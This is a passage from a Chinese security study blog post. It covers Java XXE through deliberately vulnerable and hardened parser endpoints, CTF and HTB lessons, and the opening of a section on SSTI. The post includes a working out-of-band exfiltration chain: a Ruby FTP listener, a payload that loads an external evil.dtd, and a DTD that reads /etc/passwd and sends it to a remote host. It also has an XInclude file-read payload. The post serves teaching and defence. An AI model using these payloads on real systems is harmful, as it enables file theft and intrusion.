&#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXReader reader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">            reader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            reader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            reader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">// org.dom4j.Document document</span></span><br><span class="line">            reader.read(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXReader xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXParser/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXParserVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser parser = spf.newSAXParser();</span><br><span class="line">            parser.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)), <span class="keyword">new</span> DefaultHandler());  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"SAXParser xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/SAXParser/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">SAXParserSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            spf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            spf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            spf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            SAXParser parser = spf.newSAXParser();</span><br><span class="line">            parser.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)), <span class="keyword">new</span> DefaultHandler());  <span class="comment">// parse xml</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"SAXParser xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/Digester/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DigesterVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = <span class="keyword">new</span> Digester();</span><br><span class="line">            digester.parse(<span class="keyword">new</span> StringReader(body));  <span class="comment">// parse xml</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Digester xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/Digester/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DigesterSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            Digester digester = <span class="keyword">new</span> Digester();</span><br><span class="line">            digester.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            digester.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            digester.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            digester.parse(<span class="keyword">new</span> StringReader(body));  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Digester xxe security code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有回显</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/vuln01"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderVuln01</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuilder buf = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    buf.append(String.format(<span class="string">"%s: %s\n"</span>, node.getNodeName(), node.getTextContent()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> buf.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 有回显</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/vuln02"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderVuln02</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历xml节点name和value</span></span><br><span class="line">            StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">                Node rootNode = rootNodeList.item(i);</span><br><span class="line">                NodeList child = rootNode.getChildNodes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; child.getLength(); j++) &#123;</span><br><span class="line">                    Node node = child.item(j);</span><br><span class="line">                    <span class="comment">// 正常解析XML，需要判断是否是ELEMENT_NODE类型。否则会出现多余的的节点。</span></span><br><span class="line">                    <span class="keyword">if</span> (child.item(j).getNodeType() == Node.ELEMENT_NODE) &#123;</span><br><span class="line">                        result.append(String.format(<span class="string">"%s: %s\n"</span>, node.getNodeName(), node.getFirstChild()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/Sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentBuilder xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/xinclude/vuln"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderXincludeVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"DocumentBuilder xinclude xxe vuln code"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/DocumentBuilder/xinclude/sec"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentBuilderXincludeSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line">            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line"></span><br><span class="line">            dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            DocumentBuilder db = dbf.newDocumentBuilder();</span><br><span class="line">            StringReader sr = <span class="keyword">new</span> StringReader(body);</span><br><span class="line">            InputSource is = <span class="keyword">new</span> InputSource(sr);</span><br><span class="line">            Document document = db.parse(is);  <span class="comment">// parse xml</span></span><br><span class="line"></span><br><span class="line">            NodeList rootNodeList = document.getChildNodes();</span><br><span class="line">            response(rootNodeList);</span><br><span class="line"></span><br><span class="line">            sr.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentBuilder xinclude xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/XMLReader/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">XMLReaderVuln</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"XMLReader xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/XMLReader/sec"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">XMLReaderSec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(request);</span><br><span class="line">            logger.info(body);</span><br><span class="line"></span><br><span class="line">            SAXParserFactory spf = SAXParserFactory.newInstance();</span><br><span class="line">            SAXParser saxParser = spf.newSAXParser();</span><br><span class="line">            XMLReader xmlReader = saxParser.getXMLReader();</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            xmlReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            xmlReader.parse(<span class="keyword">new</span> InputSource(<span class="keyword">new</span> StringReader(body)));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"XMLReader xxe security code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；</span></span><br><span class="line"><span class="comment">     * 不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"/DocumentHelper/vuln"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DocumentHelper</span><span class="params">(HttpServletRequest req)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String body = WebUtils.getRequestBody(req);</span><br><span class="line">            DocumentHelper.parseText(body); <span class="comment">// parse xml</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">            <span class="keyword">return</span> EXCEPT;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"DocumentHelper xxe vuln code"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">response</span><span class="params">(NodeList rootNodeList)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rootNodeList.getLength(); i++) &#123;</span><br><span class="line">            Node rootNode = rootNodeList.item(i);</span><br><span class="line">            NodeList xxe = rootNode.getChildNodes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; xxe.getLength(); j++) &#123;</span><br><span class="line">                Node xxeNode = xxe.item(j);</span><br><span class="line">                <span class="comment">// 测试不能blind xxe，所以强行加了一个回显</span></span><br><span class="line">                logger.info(<span class="string">"xxeNode: "</span> + xxeNode.getNodeValue());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的代码可以看出。可导致XXE的xml解析类有许多种。同时进行防范时大多是使用了<code>setFeature()</code>来把某个特性设置为true/false.</p><p>简单的内容同样不谈。这里关于javaxxe的几个特性稍微研究一下。先找个能回显的路由<code>/DocumentBuilder/vuln01</code></p><ul><li>java的xxe可列目录。</li></ul><p>file协议,netdoc协议均可</p><p><code>file:/ , netdoc:/</code>就能列根目录了。这点在某些写过滤大意的情况下可能会有帮助，比如只过滤了<code>file://</code>的情况。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/8.PNG" alt></p><p>这点曾经在某个比赛中遇到过。当时题目后端使用的是php。但是它有一个将xml节点渲染成图片并回显的功能。像这种功能的底部实现很有可能是java达成的。因此在不知道路径文件名读取源码时可以通过列目录解决问题。</p><ul><li>java的xxe不能读取多行的问题</li></ul><p>这个相比较php而言算是比较大的问题。php的伪协议为其读取方式带来了很大的便利,并且几乎是万金油。但是java的xxe有时读取不到多行完全是取决于jdk的版本并且普遍存在读取不了<code>&lt; %</code>的问题。</p><p>通常我们在盲打java oob xxe时普遍选择ftp协议(其实是因为支持的可外连的协议只有http/s ftp)。http只能读取单行文件。ftp则在不同版本下有不同表现<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/9.PNG" alt></p><p>这里其他大佬普遍针对这个问题进行了研究<br><a href="https://landgrey.me/blog/9/" target="_blank" rel="noopener">https://landgrey.me/blog/9/</a><br><a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a><br>结论是:</p><blockquote><p>使用ftp 进行 oob 时，对版本有限制， &lt;7u141 和 &lt;8u162 才可以读取整个文件,全版本 http 都只可以读单行文件</p></blockquote><p>总之遇到问题先打上一发看看。这里放出ftpserver的ruby代码。因为vps端口问题我把端口改了</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line">server = TCPServer.new <span class="number">8001</span></span><br><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  Thread.start(server.accept) <span class="keyword">do</span> <span class="params">|client|</span></span><br><span class="line">    puts <span class="string">"New client connected"</span></span><br><span class="line">    data = <span class="string">""</span></span><br><span class="line">    client.puts(<span class="string">"220 xxe-ftp-server"</span>)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req = client.gets()</span><br><span class="line">        puts <span class="string">"&lt; "</span>+req</span><br><span class="line">        <span class="keyword">if</span> req.<span class="keyword">include</span>? <span class="string">"USER"</span></span><br><span class="line">            client.puts(<span class="string">"331 password please - version check"</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">           <span class="comment">#puts "&gt; 230 more data please!"</span></span><br><span class="line">            client.puts(<span class="string">"230 more data please!"</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/10.PNG" alt></p><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xxxx/evil.dtd"</span>&gt;</span>%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">payload</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://fakeuser:fakepass@xxxxxxxx:8001/%payload;'&gt;"</span>&gt;</span></span><br><span class="line">%int;</span><br><span class="line">%trick</span><br></pre></td></tr></table></figure><p>当然以上针对的是OOB.也就是盲打外带的方法</p><ul><li>Xinclude xxe</li></ul><p>这点我倒是非常感兴趣。因为前不久的htb Quick这台靶机就用到了xinclude+xslt的RCE(没错,其实是引入通过外部xml达成RCE)</p><p>当然不是所有服务都能像Esigate那样有这么低级的错误。正常来说我们一般是可以尝试xxe读文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">"file:///etc/passwd"</span> <span class="attr">parse</span>=<span class="string">"text"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对于php而言。不需要打开外部实体引用选项，也能使用xinclude读取本地文件。</p><p>这里顺便分享下htb 那里参考的文章。我认为其利用对于提升xxe作用这点是很有参考价值的。<a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/</a></p><p>总而言之,java进行xxe相比常见的php后端而言多了许多限制。但是可以列目录这点是关键。同时遇到要盲打时，ftp是最好的选择。防御上,使用setFeature就能让外部实体不被加载。</p><h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>Java的ssti相比较jinja等等而言还是很好理解的。只是对于不同框架应对手段不同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.velocity.app.Velocity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/ssti"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SSTI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * SSTI of Java velocity. The latest Velocity version still has this problem.</span></span><br><span class="line"><span class="comment">     * Fix method: Avoid to use Velocity.evaluate method.</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;</span></span><br><span class="line"><span class="comment">     * 